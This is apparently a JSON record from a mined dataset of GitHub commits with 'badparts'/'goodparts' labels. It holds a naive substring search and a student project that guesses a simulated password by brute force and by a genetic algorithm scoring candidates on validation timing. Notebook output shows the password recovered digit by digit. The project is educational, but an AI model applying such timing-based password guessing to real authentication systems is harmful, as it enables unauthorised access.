algorithm"}},"https:\/\/github.com\/souparnabose99\/cs-algorithms-python":{"17fc0baefcd203bd00a2c0a49793da799ab846aa":{"url":"https:\/\/api.github.com\/repos\/souparnabose99\/cs-algorithms-python\/commits\/17fc0baefcd203bd00a2c0a49793da799ab846aa","html_url":"https:\/\/github.com\/souparnabose99\/cs-algorithms-python\/commit\/17fc0baefcd203bd00a2c0a49793da799ab846aa","message":"Update brute_force_substr_search.py","sha":"17fc0baefcd203bd00a2c0a49793da799ab846aa","keyword":"brute force update","diff":"diff --git a\/substring-search\/brute_force_substr_search.py b\/substring-search\/brute_force_substr_search.py\nindex 0653ffe..db6c4b4 100644\n--- a\/substring-search\/brute_force_substr_search.py\n+++ b\/substring-search\/brute_force_substr_search.py\n@@ -1,3 +1,20 @@\n \n-def naive_search():\n-  return None\n+def naive_search(pattern, text):\n+    n = len(text)\n+    m = len(pattern)\n+    # Do single character matching from left to right, shift by 1 if there is a mismatch\n+\n+    # O(N)\n+    for i in range(n-m+1):\n+        j = 0\n+        # Worst case : O(N*M)\n+        while j < m:\n+            if text[i+j] != pattern[j]:\n+                break\n+\n+            j += 1\n+        if j == m:\n+            print(\"Found matching pattern at index : \", i)\n+\n+\n+naive_search(\"abc\", \"dhe ua bibabc\")\n","files":{"\/substring-search\/brute_force_substr_search.py":{"changes":[{"diff":"\n \n-def naive_search():\n-  return None\n+def naive_search(pattern, text):\n+    n = len(text)\n+    m = len(pattern)\n+    # Do single character matching from left to right, shift by 1 if there is a mismatch\n+\n+    # O(N)\n+    for i in range(n-m+1):\n+        j = 0\n+        # Worst case : O(N*M)\n+        while j < m:\n+            if text[i+j] != pattern[j]:\n+                break\n+\n+            j += 1\n+        if j == m:\n+            print(\"Found matching pattern at index : \", i)\n+\n+\n+naive_search(\"abc\", \"dhe ua bibabc\")\n","add":19,"remove":2,"filename":"\/substring-search\/brute_force_substr_search.py","badparts":["def naive_search():","  return None"],"goodparts":["def naive_search(pattern, text):","    n = len(text)","    m = len(pattern)","    for i in range(n-m+1):","        j = 0","        while j < m:","            if text[i+j] != pattern[j]:","                break","            j += 1","        if j == m:","            print(\"Found matching pattern at index : \", i)","naive_search(\"abc\", \"dhe ua bibabc\")"]}],"source":"\n\ndef naive_search(): return None ","sourceWithComments":"\ndef naive_search():\n  return None\n"}},"msg":"Update brute_force_substr_search.py"}},"https:\/\/github.com\/Cpod2\/ai_final_project":{"b929978ff8288e1cceb6ef723152f1fdbcdb21ca":{"url":"https:\/\/api.github.com\/repos\/Cpod2\/ai_final_project\/commits\/b929978ff8288e1cceb6ef723152f1fdbcdb21ca","html_url":"https:\/\/github.com\/Cpod2\/ai_final_project\/commit\/b929978ff8288e1cceb6ef723152f1fdbcdb21ca","message":"Update genetic algorithm and auth\n\n* Increase password complexity to 10\n  digits\n* Add brute force implementation for\n  baseline comparison\n* Use median of timing variable instead\n  of average. This improves the accuracy\n  of the fitness scores.\n* Refactor ga to take arguments from\n  notebook\n* Update notebook with partial results","sha":"b929978ff8288e1cceb6ef723152f1fdbcdb21ca","keyword":"brute force update","diff":"diff --git a\/auth.py b\/auth.py\nindex 620cb24..6648857 100644\n--- a\/auth.py\n+++ b\/auth.py\n@@ -2,9 +2,7 @@\n Simulated Authentication Function\n \"\"\"\n \n-from time import sleep\n-\n-PASSWORD = \"12345678\"\n+PASSWORD = \"0123456789\"\n \n \n def validate(password):\ndiff --git a\/bf.py b\/bf.py\nnew file mode 100644\nindex 0000000..bee8d0b\n--- \/dev\/null\n+++ b\/bf.py\n@@ -0,0 +1,72 @@\n+\"\"\"\n+Brute Force Algorithm to guess a password \n+on a weak password validation method\n+\"\"\"\n+\n+import argparse\n+\n+from auth import validate\n+\n+\n+def parse_args():\n+    \"\"\"Parse command line arguments\"\"\"\n+    # pylint: disable=duplicate-code\n+    parser = argparse.ArgumentParser()\n+    parser.add_argument(\n+        \"-n\",\n+        \"--number-iterations\",\n+        help=\"Number of Iterations\",\n+        type=int,\n+        default=0,\n+        dest=\"NUMBER_ITERATIONS\",\n+    )\n+    parser.add_argument(\n+        \"--brake-on-solution\",\n+        help=\"Stop when a solution is found\",\n+        type=bool,\n+        action=argparse.BooleanOptionalAction,\n+        default=False,\n+        dest=\"BRAKE_ON_SOLUTION\",\n+    )\n+\n+    return parser.parse_args()\n+\n+\n+NUMBER_ITERATIONS = 0\n+BRAKE_ON_SOLUTION = False\n+\n+\n+def main(args):\n+    \"\"\"\n+    Main Function.\n+    \"\"\"\n+    solution = None\n+\n+    # Explore the search space exhaustively\n+    for i in range(10**10):\n+        # Each iteration generates a candidate\n+        # password from 0000000000 to\n+        # 9999999999. Then it validates the\n+        # candidate, and checks for early\n+        # stopping conditions\n+        candidate = f\"{i}\".zfill(10)\n+        if validate(candidate):\n+            solution = candidate\n+        if solution and args[\"BRAKE_ON_SOLUTION\"]:\n+            break\n+        if args[\"NUMBER_ITERATIONS\"] != 0 and i >= args[\"NUMBER_ITERATIONS\"]:\n+            break\n+\n+    # Print the solution\n+    print(f\"Solution = {solution}\")\n+\n+\n+if __name__ == \"__main__\":\n+    cli_args = parse_args()\n+\n+    main(\n+        {\n+            \"NUMBER_ITERATIONS\": cli_args.NUMBER_ITERATIONS,\n+            \"BRAKE_ON_SOLUTION\": cli_args.BRAKE_ON_SOLUTION,\n+        }\n+    )\ndiff --git a\/ga.py b\/ga.py\nindex e20bf5c..30e6a63 100644\n--- a\/ga.py\n+++ b\/ga.py\n@@ -5,6 +5,8 @@\n \n import argparse\n import random\n+import statistics\n+import string\n import time\n from typing import List\n \n@@ -15,6 +17,7 @@\n \n def parse_args():\n     \"\"\"Parse command line arguments\"\"\"\n+    # pylint: disable=duplicate-code\n     parser = argparse.ArgumentParser()\n     parser.add_argument(\n         \"-p\",\n@@ -60,22 +63,17 @@ def parse_args():\n     return parser.parse_args()\n \n \n-POPULATION_SIZE = 100\n-NUMBER_ITERATIONS = 10000\n-MUTATION_PCT = 0.5\n-BRAKE_ON_SOLUTION = False\n-OUTPUT = \"plot\"\n-\n-\n def create_population(population_size: int) -> List[str]:\n     \"\"\"\n     Returns a population of members.\n-    Members are strings of 8 digits.\n-    Allowed digits are 1 to 8.\n+    Members are strings of 10 characters.\n+    Allowed digits are 0 to 9.\n     The string encodes a password\n     candidate.\n     \"\"\"\n-    return [\"\".join(random.choices(\"12345678\", k=8)) for _ in range(population_size)]\n+    return [\n+        \"\".join(random.choices(string.digits, k=10)) for _ in range(population_size)\n+    ]\n \n \n def calculate_fitness(member: str) -> int:\n@@ -89,15 +87,15 @@ def calculate_fitness(member: str) -> int:\n     A higher average number means our candidate\n     is close to the password.\n     \"\"\"\n-    accumulator = 0\n     iterations = 10\n+    results = []\n     for _ in range(iterations):\n         start = time.time_ns()\n         validate(member)\n         end = time.time_ns()\n-        accumulator += end - start\n+        results.append(end - start)\n \n-    return accumulator \/ iterations\n+    return statistics.median(results)\n \n \n def select_parents(population: List[str]) -> List[str]:\n@@ -152,7 +150,7 @@ def do_mutation(member: str, pct: float = 0.8) -> str:\n     should_mutate = random.random() > (1 - pct)\n     if should_mutate:\n         index = random.randint(0, len(member) - 1)\n-        target = random.choices(\"12345678\", k=1)[0]\n+        target = random.choices(string.digits, k=1)[0]\n         temp = list(member)\n         temp[index] = target\n         member = \"\".join(temp)\n@@ -160,7 +158,7 @@ def do_mutation(member: str, pct: float = 0.8) -> str:\n     return member\n \n \n-def main():\n+def main(args):\n     \"\"\"\n     Main Function.\n \n@@ -171,7 +169,7 @@ def main():\n     generation is created based on crossover and\n     mutations operations.\n     \"\"\"\n-    population = create_population(POPULATION_SIZE)\n+    population = create_population(args[\"POPULATION_SIZE\"])\n     solution = None\n     average = []\n     best = []\n@@ -181,14 +179,15 @@ def main():\n         print(f\"Member {member} Fitness {calculate_fitness(member)}\")\n     print(\"\")\n \n-    for _ in range(NUMBER_ITERATIONS):\n+    for _ in range(args[\"NUMBER_ITERATIONS\"]):\n         # Check if any of the candidates in the next\n         # generation is a solution\n         for _, candidate in enumerate(population):\n             if validate(candidate):\n                 solution = candidate\n-                if BRAKE_ON_SOLUTION:\n-                    break\n+\n+        if solution and args[\"BRAKE_ON_SOLUTION\"]:\n+            break\n \n         parents, scores = select_parents(population)\n         average.append(sum(scores) \/ len(scores))\n@@ -198,13 +197,11 @@ def main():\n         for i in range(0, len(parents), 2):\n             parent1 = parents[i]\n             parent2 = parents[i + 1]\n-            score1 = scores[i]\n-            score2 = scores[i + 1]\n             offspring1 = do_crossover(parent1=parent1, parent2=parent2)\n-            offspring1 = do_mutation(offspring1, MUTATION_PCT)\n+            offspring1 = do_mutation(offspring1, args[\"MUTATION_PCT\"])\n             next_generation.append(offspring1)\n             offspring2 = do_crossover(parent1=parent2, parent2=parent1)\n-            offspring2 = do_mutation(offspring2, MUTATION_PCT)\n+            offspring2 = do_mutation(offspring2, args[\"MUTATION_PCT\"])\n             next_generation.append(offspring2)\n \n         population = next_generation\n@@ -224,16 +221,19 @@ def main():\n     plt.title(\"Fitness Over Population Generation\")\n     plt.xlabel(\"Population Generation\")\n     plt.ylabel(\"Fitness\")\n-    plt.savefig(OUTPUT)\n+    plt.savefig(args[\"OUTPUT\"])\n     plt.show(block=True)\n \n \n if __name__ == \"__main__\":\n-    args = parse_args()\n-    POPULATION_SIZE = args.POPULATION_SIZE\n-    NUMBER_ITERATIONS = args.NUMBER_ITERATIONS\n-    MUTATION_PCT = args.MUTATION_PCT\n-    BRAKE_ON_SOLUTION = args.BRAKE_ON_SOLUTION\n-    OUTPUT = args.OUTPUT\n-\n-    main()\n+    cli_args = parse_args()\n+\n+    main(\n+        {\n+            \"POPULATION_SIZE\": cli_args.POPULATION_SIZE,\n+            \"NUMBER_ITERATIONS\": cli_args.NUMBER_ITERATIONS,\n+            \"MUTATION_PCT\": cli_args.MUTATION_PCT,\n+            \"BRAKE_ON_SOLUTION\": cli_args.BRAKE_ON_SOLUTION,\n+            \"OUTPUT\": cli_args.OUTPUT,\n+        }\n+    )\ndiff --git a\/index.ipynb b\/index.ipynb\nindex 06b5635..631a621 100644\n--- a\/index.ipynb\n+++ b\/index.ipynb\n@@ -2,7 +2,7 @@\n  \"cells\": [\n   {\n    \"cell_type\": \"code\",\n-   \"execution_count\": 9,\n+   \"execution_count\": 1,\n    \"metadata\": {},\n    \"outputs\": [],\n    \"source\": [\n@@ -22,36 +22,38 @@\n   },\n   {\n    \"cell_type\": \"code\",\n-   \"execution_count\": 20,\n+   \"execution_count\": 39,\n    \"metadata\": {},\n    \"outputs\": [\n     {\n      \"name\": \"stdout\",\n      \"output_type\": \"stream\",\n      \"text\": [\n-      \"11111111 - 594.84\\n\",\n-      \"12111111 - 583.0\\n\",\n-      \"12311111 - 687.36\\n\",\n-      \"12341111 - 641.76\\n\",\n-      \"12345111 - 663.0\\n\",\n-      \"12345611 - 766.36\\n\",\n-      \"12345671 - 773.24\\n\",\n-      \"12345678 - 776.84\\n\"\n+      \"0000000000 - 679.5\\n\",\n+      \"0100000000 - 714.5\\n\",\n+      \"0120000000 - 797.5\\n\",\n+      \"0123000000 - 867.5\\n\",\n+      \"0123400000 - 954.0\\n\",\n+      \"0123450000 - 1048.0\\n\",\n+      \"0123456000 - 1089.5\\n\",\n+      \"0123456700 - 1178.0\\n\",\n+      \"0123456780 - 1260.0\\n\",\n+      \"0123456789 - 1185.5\\n\"\n      ]\n     },\n     {\n      \"data\": {\n       \"text\/plain\": [\n-       \"[<matplotlib.lines.Line2D at 0x7f5f3e10c350>]\"\n+       \"[<matplotlib.lines.Line2D at 0x7f7395f649d0>]\"\n       ]\n      },\n-     \"execution_count\": 20,\n+     \"execution_count\": 39,\n      \"metadata\": {},\n      \"output_type\": \"execute_result\"\n     },\n     {\n      \"data\": {\n-      \"image\/png\": \"iVBORw0KGgoAAAANSUhEUgAAAigAAAGdCAYAAAA44ojeAAAAOXRFWHRTb2Z0d2FyZQBNYXRwbG90bGliIHZlcnNpb24zLjcuMSwgaHR0cHM6Ly9tYXRwbG90bGliLm9yZy\/bCgiHAAAACXBIWXMAAA9hAAAPYQGoP6dpAABLg0lEQVR4nO3deVxU9f4\/8NcMwwzbDPswoAjugiCS5Iblrqiltmh1tSxNy\/BaWt2+3l+r3au23G63bteya1TXzFvdxC0XNJdK3FBUXBBXUBhAWQYQBmbm\/P4ARidwGYQ5s7yej8c8as45M\/M+hM6r8\/mcz1siCIIAIiIiIjsiFbsAIiIiot9jQCEiIiK7w4BCREREdocBhYiIiOwOAwoRERHZHQYUIiIisjsMKERERGR3GFCIiIjI7sjELqAlTCYT8vPzoVQqIZFIxC6HiIiIboMgCKioqEBYWBik0ptfI3HIgJKfn4\/w8HCxyyAiIqIWyMvLQ\/v27W96jEMGFKVSCaD+BFUqlcjVEBER0e3Q6XQIDw83f4\/fjEMGlMZhHZVKxYBCRETkYG5negYnyRIREZHdYUAhIiIiu8OAQkRERHaHAYWIiIjsDgMKERER2R0GFCIiIrI7DChERERkdxhQiIiIyO4woBAREZHdYUAhIiIiu8OAQkRERHaHAYWIiIjsjlUBJTIyEhKJpMkjOTkZ58+fb3afRCLB999\/b36P5vavWrWq1U+MiIiIbs5kEnClUo8TBTrsPFWM7w\/k4ZPtp\/Hm2mPYcKRA1Nqs6ma8f\/9+GI1G8\/OsrCyMHDkSkyZNQnh4OAoKLE9m2bJleO+99zBmzBiL7SkpKUhKSjI\/9\/Pza0HpRERE1JxagwmXK\/UoqtCjSFdT\/88KPYor9CiuaHiu0+NypR4Gk9Dse+gNJozrFWrjyq+xKqAEBwdbPF+yZAk6d+6MwYMHQyKRQKPRWOxfvXo1Jk+eDB8fH4vtfn5+TY4lIiKim6vUG1Ckq0FxQ+Cof9Q0BI\/60FFUUYPSq3VWvW+gtxzBSgWClQqolR5QqxTo08G\/jc7i9lgVUK5XW1uLFStWYP78+ZBIJE32Z2RkIDMzE5988kmTfcnJyXj66afRqVMnPPvss3jqqaeafQ8iIiJnZzIJKL1aa77C0Rg6inT6a8Gj4arH1Vrjrd+wgbubBME+iobgUR861A0BpD6IKKBWKRDko4C7m\/1NSW1xQElNTUVZWRmefPLJZvcvX74cUVFRGDhwoMX2hQsXYtiwYfDy8sKWLVvw3HPPobKyEnPnzr3hZ+n1euj1evNznU7X0rKJiIhs4vphluLrQkdRwzBL8XXDLjcaZmmOt9zNfKUj+LrQoW68AqKqf+7n6Q6p1HH\/518iCMLt\/1SuM3r0aMjlcqxbt67JvurqaoSGhuK1117Diy++eNP3ef3115GSkoK8vLwbHvPmm2\/irbfearK9vLwcKpXK+uKJiIhaqEpvsJjbUfy7oZYinR7FlXqUVNVa9b4B3nJzyAi+LnSoVQoE+yigVtU\/91a0+NqC6HQ6HXx9fW\/r+7tFAeXChQvo1KkTfvzxR0yYMKHJ\/v\/85z+YMWMGLl261GTeyu9t2LAB9913H2pqaqBQKJo9prkrKOHh4QwoRETUqir1Bpws0OHClavXhloq9CjWXQsgVVYMs8ikEvNwinmo5bqrHI37gnwUkMvsb5iltVkTUFoUw1JSUqBWqzFu3Lhm9y9fvhzjx4+\/ZTgBgMzMTPj7+98wnACAQqG46X4iIiJrCIKA\/PIanMjX4XiBDicK6v954crV23q9l9zNYj7H9UMr5qEWpQL+XnKHHmYRk9UBxWQyISUlBdOmTYNM1vTlp0+fxq5du\/DTTz812bdu3ToUFhaif\/\/+8PDwQFpaGhYtWoSXXnqpZdUTERHdgt5gRE5hpTmI1D8qUF7d\/J0uISoFuqh9EGKe49Fw1cMcRDzg48DDLI7C6p\/w1q1bkZubi+nTpze7\/4svvkD79u0xatSoJvvc3d3xySefYN68eRAEAV26dMEHH3yAmTNnWl85ERHR79QvOlZhviJyokCH00WVzU5ClUkl6KL2QXSoClHmhxKBPrxibw9aPElWTNaMYRERkfMxmgScu1xlviLSGEYKdfpmj\/f1dEdUqBLRob71\/wxToYvaBwqZm40rd21tPgeFiIjIVhonrtYHkQocL9AhW6tDTZ2p2eMjA70QFaoyXxmJDlMh1NeD6205GAYUIiKyC9ZOXPV0d0N3jdIcQqJDleiuUXF+iJPgf0UiIrK5xomr1w\/P3GziqkblgajQa2EkKlSFyEBvuPEOGafFgEJERG3qTiauNoaRAG+5CJWTmBhQiIioVbRk4mr0dXfPcOIqXY8BhYiIrNaSiavRYSpEaThxlW4PAwoREd1QSyeuNg7NcOIqtRR\/Y4iIyEwQBPx0VIsDF0pue+JqYxjhxFVqTQwoRERktvmYFskrD1psu37i6vVhhBNXqS0xoBARkdkPGRcBAPd0DcKE3u0QFarkxFUSBQMKEREBAEqqarEjuxgA8Pp90egaohS5InJlUrELICIi+7DhSD4MJgEx7VQMJyQ6BhQiIgIArD50CQAwsXc7kSshYkAhIiIAF65U4WBuGaQSYHxcmNjlEDGgEBERkHooHwCQ2CUIapWHyNUQMaAQEbk8QRCQmlk\/vPNAPId3yD4woBARubjDF8tx7nIVPN3dMLqnRuxyiAAwoBARubzUhsmxo3qGwJtL0pOdYEAhInJhdUYT1h2un38ykcM7ZEcYUIiIXNivOZdxpaoWQT5y3NMlSOxyiMwYUIiIXFjj2if3x4VB5savBLIf\/G0kInJRlXoDthzXAuDdO2R\/GFCIiFzU5iwtaupM6BTsjdh2vmKXQ2SBAYWIyEWZ1z7p3Q4SiUTkaogsMaAQEbmgQl0Nfjt9GQAwgb13yA4xoBARuaB1h\/NhEoCECH90CPQSuxyiJhhQiIhckLlzMSfHkp1iQCEicjGnCitwLF8HdzcJxsWGil0OUbMYUIiIXEzj1ZMh3dXw95aLXA1R8xhQiIhciMkkYM0hdi4m+8eAQkTkQvadL0F+eQ2UChmG9VCLXQ7RDTGgEBG5kMbOxWNjQ+Hh7iZyNUQ3xoBCROQiauqM2HC0AADv3iH7Z1VAiYyMhEQiafJITk4GAAwZMqTJvmeffdbiPXJzczFu3Dh4eXlBrVbj5ZdfhsFgaL0zIiKiZm0\/WYSKGgNCfT3Qr2OA2OUQ3ZTMmoP3798Po9Fofp6VlYWRI0di0qRJ5m0zZ87EwoULzc+9vK4tAGQ0GjFu3DhoNBrs3r0bBQUFeOKJJ+Du7o5FixbdyXkQEdEtNN69M6F3O0ilXNqe7JtVASU4ONji+ZIlS9C5c2cMHjzYvM3LywsajabZ12\/ZsgXHjx\/H1q1bERISgt69e+Ptt9\/GK6+8gjfffBNyOW93IyJqC2VXa7E9uwgA794hx9DiOSi1tbVYsWIFpk+fbtFk6ptvvkFQUBBiYmKwYMECXL161bwvPT0dsbGxCAkJMW8bPXo0dDodjh07dsPP0uv10Ol0Fg8iIrp9G44WoM4oICpUhe4apdjlEN2SVVdQrpeamoqysjI8+eST5m1\/+MMfEBERgbCwMBw5cgSvvPIKsrOz8eOPPwIAtFqtRTgBYH6u1Wpv+FmLFy\/GW2+91dJSiYhcXqp57ZMwkSshuj0tDijLly\/HmDFjEBZ27Zd91qxZ5n+PjY1FaGgohg8fjjNnzqBz584tLnLBggWYP3+++blOp0N4eHiL34+IyJXklVzF\/vOlkEiA8XEc3iHH0KKAcuHCBWzdutV8ZeRG+vXrBwA4ffo0OnfuDI1Gg3379lkcU1hYCAA3nLcCAAqFAgqFoiWlEhG5vDWZ9VdPBnYOhMbXQ+RqiG5Pi+agpKSkQK1WY9y4cTc9LjMzEwAQGlrfjGrAgAE4evQoioqKzMekpaVBpVIhOjq6JaUQEdFNCIJwrXNxb149Icdh9RUUk8mElJQUTJs2DTLZtZefOXMGK1euxNixYxEYGIgjR45g3rx5uPfee9GrVy8AwKhRoxAdHY3HH38c7777LrRaLV599VUkJyfzCgkRURvIuqTDmeIqKGRSJMXc+Eo1kb2xOqBs3boVubm5mD59usV2uVyOrVu34sMPP0RVVRXCw8Px0EMP4dVXXzUf4+bmhvXr12P27NkYMGAAvL29MW3aNIt1U4iIqPU0Xj0Z1VMDpYe7yNUQ3T6JIAiC2EVYS6fTwdfXF+Xl5VCpVGKXQ0RklwxGE\/ov\/hmXK\/X44skEDOsRcusXEbUha76\/2YuHiMhJ\/XbmCi5X6hHgLcc9XYNv\/QIiO8KAQkTkpBrXPrm\/Vyjc3fjXPTkW\/sYSETmhKr0Bm7LqF8Bk52JyRAwoREROKO14IarrjIgM9ELvcD+xyyGyGgMKEZETMq99Et\/Ool8akaNgQCEicjLFFXr8klMMgIuzkeNiQCEicjJrD+fDJADxHfwQGeQtdjlELcKAQkTkZK51LubVE3JcDChERE7kdFEFjl4qh0wqwbjYULHLIWoxBhQiIieSeigfADC4WzACfdjjjBwXAwoRkZMwmQSkZl67e4fIkTGgEBE5iYzcUlwsrYaPQoYRUey7Q46NAYWIyEk0rn2SFKOBp9xN5GqI7gwDChGRE9AbjNhwpAAA794h58CAQkTkBHZkF6O8ug4hKgX6dwoUuxyiO8aAQkTkBBrXPpnQux3cpFzanhwfAwoRkYMrr67DthNFALi0PTkPBhQiIge38WgBao0mdA9RIipUKXY5RK2CAYWIyMGxczE5IwYUIiIHdqmsGnvPlQAAJvQOE7kaotbDgEJE5MDWNKwc279TAML8PEWuhqj1MKAQETkoQRCw+iA7F5NzYkAhInJQxwt0yCmqhFwmxRh2LiYnw4BCROSgGtc+GRkVApWHu8jVELUuBhQiIgdkNAlYk5kPgJ2LyTkxoBAROaD0M1dQVKGHn5c7BncLFrscolbHgEJE5IAa1z65r1co5DL+VU7Oh7\/VREQOprrWiE1Z7FxMzo0BhYjIwWw5rkVVrRHhAZ64q4O\/2OUQtQkGFCIiB9N4984Dvbm0PTkvBhQiIgdyuVKPXTmXAQATOLxDTowBhYjIgaw\/nA+jSUBce190DvYRuxyiNmNVQImMjIREImnySE5ORklJCf74xz+ie\/fu8PT0RIcOHTB37lyUl5dbvEdzr1+1alWrnhQRkbNazbVPyEXIrDl4\/\/79MBqN5udZWVkYOXIkJk2ahPz8fOTn5+P9999HdHQ0Lly4gGeffRb5+fn44YcfLN4nJSUFSUlJ5ud+fn53dhZERC7gbHElDueVwU0qwX292LmYnJtVASU42HIxoCVLlqBz584YPHgwJBIJ\/ve\/\/5n3de7cGX\/9618xdepUGAwGyGTXPsrPzw8ajeYOSycici2pDVdP7ukahGClQuRqiNpWi+eg1NbWYsWKFZg+ffoNZ5GXl5dDpVJZhBMASE5ORlBQEPr27YsvvvgCgiDc9LP0ej10Op3Fg4jIlQiCcO3uHQ7vkAuw6grK9VJTU1FWVoYnn3yy2f2XL1\/G22+\/jVmzZllsX7hwIYYNGwYvLy9s2bIFzz33HCorKzF37twbftbixYvx1ltvtbRUIiKHdzC3DLklV+Eld8PI6BCxyyFqcxLhVpcvbmD06NGQy+VYt25dk306nQ4jR45EQEAA1q5dC3f3G3fZfP3115GSkoK8vLwbHqPX66HX6y3ePzw83HyFhojI2b2WmoX\/7LmAB+Pb4YNHeotdDlGL6HQ6+Pr63tb3d4uGeC5cuICtW7fi6aefbrKvoqICSUlJUCqVWL169U3DCQD069cPFy9etAggv6dQKKBSqSweRESuotZgwvojvHuHXEuLAkpKSgrUajXGjRtnsV2n02HUqFGQy+VYu3YtPDw8bvlemZmZ8Pf3h0LBCV9ERM3ZdaoYpVfrEKxUYGDnQLHLIbIJq+egmEwmpKSkYNq0aRaTXxvDydWrV7FixQqLyazBwcFwc3PDunXrUFhYiP79+8PDwwNpaWlYtGgRXnrppdY7IyIiJ7M6s35y7Pi4MMjcuL4muQarA8rWrVuRm5uL6dOnW2w\/ePAg9u7dCwDo0qWLxb5z584hMjIS7u7u+OSTTzBv3jwIgoAuXbrggw8+wMyZM+\/gFIiInJeupg5bjxcC4N075FpaPElWTNZMsiEicmTfHcjDn344gi5qH6TNu5fNAcmhtfkkWSIiso3r1z5hOCFXwoBCRGSnCsqrkX72CoD6+SdEroQBhYjITq3NzIcgAH07BiA8wEvscohsigGFiMhOrebS9uTCGFCIiOzQiQIdTmorIHeTYmxMqNjlENkcAwoRkR1KbVj7ZFgPNXy9br4iN5EzYkAhIrIzRpOANYe4tD25NgYUIiI7s\/fsFWh1NVB5yDC0R7DY5RCJggGFiMjONE6OHdcrDAqZm8jVEImDAYWIyI7U1BmxMUsLgHfvkGtjQCEisiNbTxSiUm9AOz9PJET4i10OkWgYUIiI7Ejj0vYT48MglXJpe3JdDChERHaipKoWO7KLAQATe3N4h1wbAwoRkZ3YcCQfBpOAmHYqdA1Ril0OkagYUIiI7ETj3Tu8ekLEgEJEZBcuXKnCwdwySCXsXEwEMKAQEdmF1IaVYxO7BEGt8hC5GiLxMaAQEYlMEARz7x2ufUJUjwGFiEhkhy+W49zlKni6u2F0T43Y5RDZBQYUIiKRNa59MqpnCLwVMpGrIbIPDChERCKqM5qw7jA7FxP9HgMKEZGIfs25jCtVtQj0luOeLkFil0NkNxhQiIhE1Lj2yf1xYZC58a9kokb800BEJJJKvQFbjrNzMVFzGFCIiESyOUuLmjoTOgV5o1d7X7HLIbIrDChERCK5fu0TiYSdi4mux4BCRCSCQl0Nfjt9GQAwgb13iJpgQCEiEsHazHyYBCAhwh8dAr3ELofI7jCgEBGJwNy5mJNjiZrFgEJEZGPZ2gocL9DB3U2CcbGhYpdDZJcYUIiIbKxxcuyQ7mr4e8tFrobIPjGgEBHZkMkkYM0hdi4muhWrAkpkZCQkEkmTR3JyMgCgpqYGycnJCAwMhI+PDx566CEUFhZavEdubi7GjRsHLy8vqNVqvPzyyzAYDK13RkREdmzf+RLkl9dAqZBhWA+12OUQ2S2rAsr+\/ftRUFBgfqSlpQEAJk2aBACYN28e1q1bh++\/\/x47d+5Efn4+HnzwQfPrjUYjxo0bh9raWuzevRtfffUVvvzyS7z++uuteEpERParsXPx2NhQeLi7iVwNkf2SCIIgtPTFL7zwAtavX4+cnBzodDoEBwdj5cqVePjhhwEAJ0+eRFRUFNLT09G\/f39s3LgR9913H\/Lz8xESEgIA+PTTT\/HKK6+guLgYcvntjcXqdDr4+vqivLwcKpWqpeUTEdlUTZ0Rd\/91KypqDPh2Zn8M6BwodklENmXN93eL56DU1tZixYoVmD59OiQSCTIyMlBXV4cRI0aYj+nRowc6dOiA9PR0AEB6ejpiY2PN4QQARo8eDZ1Oh2PHjrW0FCIih7D9ZBEqagwI9fVAv44BYpdDZNdkLX1hamoqysrK8OSTTwIAtFot5HI5\/Pz8LI4LCQmBVqs1H3N9OGnc37jvRvR6PfR6vfm5TqdradlERKJpXPtkQu92kEq5tD3RzbT4Csry5csxZswYhIWFtWY9zVq8eDF8fX3Nj\/Dw8Db\/TCKi1lR2tRbbs4sA8O4dotvRooBy4cIFbN26FU8\/\/bR5m0ajQW1tLcrKyiyOLSwshEajMR\/z+7t6Gp83HtOcBQsWoLy83PzIy8trSdlERKLZcLQAdUYBUaEqdNcoxS6HyO61KKCkpKRArVZj3Lhx5m19+vSBu7s7tm3bZt6WnZ2N3NxcDBgwAAAwYMAAHD16FEVFReZj0tLSoFKpEB0dfcPPUygUUKlUFg8iIkeSal77pO2vOhM5A6vnoJhMJqSkpGDatGmQya693NfXFzNmzMD8+fMREBAAlUqFP\/7xjxgwYAD69+8PABg1ahSio6Px+OOP491334VWq8Wrr76K5ORkKBSK1jsrIiI7kldyFfvPl0IiAcbHcXiH6HZYHVC2bt2K3NxcTJ8+vcm+v\/\/975BKpXjooYeg1+sxevRo\/Otf\/zLvd3Nzw\/r16zF79mwMGDAA3t7emDZtGhYuXHhnZ0FEZMfWNCxtP7BzIDS+HiJXQ+QY7mgdFLFwHRQichSCIGDEBztxprgK7z3cC5MSOMmfXJdN1kEhIqJby7qkw5niKihkUiTF3PhmACKyxIBCRNSGGtc+GRkdAqWHu8jVEDkOBhQiojZiMJqw9nA+AK59QmQtBhQiojby25kruFyph7+XO+7tFix2OUQOhQGFiKiNNK59cn9cGNzd+NctkTX4J4aIqA1U6Q3YlFXfY2wih3eIrMaAQkTUBrYc16K6zojIQC\/Eh\/uJXQ6Rw2FAISJqA6sP1U+OnRjfDhIJOxcTWYsBhYiolRVV1ODXnGIAwMTeHN4hagkGFCKiVrbucAFMAhDfwQ+RQd5il0PkkBhQiIha2bXOxbx6QtRSDChERK3odFEFjl4qh0wqwbjYULHLIXJYDChERK0otWFy7OBuwQj0UYhcDZHjYkAhImolJpOA1Mz64R2ufUJ0ZxhQiK6jq6nD9wfyUKk3iF0KOaCM3FJcLK2Gj0KGEVEhYpdD5NAYUIius2TjSbz8wxHM+voADEaT2OWQg2nsXJwUo4Gn3E3kaogcGwMKUYOaOiPWNXSe3X3mCv6y4YTIFZEj0RuM2HCkAADv3iFqDQwoRA12ZBehosYAH4UMAPDl7vP4bn+eyFWRo9iRXYzy6jqEqBTo3ylQ7HKIHB4DClGDxrsvpvTrgHkjugEA\/l\/qUWRcKBGzLHIQjWufTOjdDm5SLm1PdKcYUIgAlFfX4eeTRQDqv2D+OKwLxsRoUGcU8Mx\/DqKgvFrkCsmelVfXYduJ+t8fLm1P1DoYUIgAbMoqQK3RhG4hPogKVUIqleD9SXHooVHicqUes77OQE2dUewyyU5tPFr\/+9M9RImoUKXY5RA5BQYUIlwb3pnQ+1rnWW+FDJ8\/kQB\/L3ccvVSO\/\/vfEQiCIGaZZKca795h52Ki1sOAQi6voLwae85dAQBM6B1msS88wAufTLkLblIJUjPzsWzXWTFKJDt2qawae8\/Vz1P6\/e8PEbUcAwq5vLWZ+RAE4O5If7T392qyf2DnILxxfzQAYMmmk9iRXWTrEsmOrWlYObZ\/pwCE+XmKXA2R82BAIZeXmlk\/vHOzpckf7x+Bx\/qGQxCAP357CGeKK21VHtkxQRCw+iA7FxO1BQYUcmmnCitwokAHd7ebd56VSCR4a3wMEiL8UVFjwMyvD0BXU2fDSskeHS\/QIaeoEnKZFEkx7FxM1JoYUMilNa5dMbibGn5e8pseK5dJsXRqH4T5euBscRWe\/\/YQjCZOmnVljb8\/I6LU8PV0F7kaIufCgEIuy2QSsMY8vHN7kxuDlQoseyI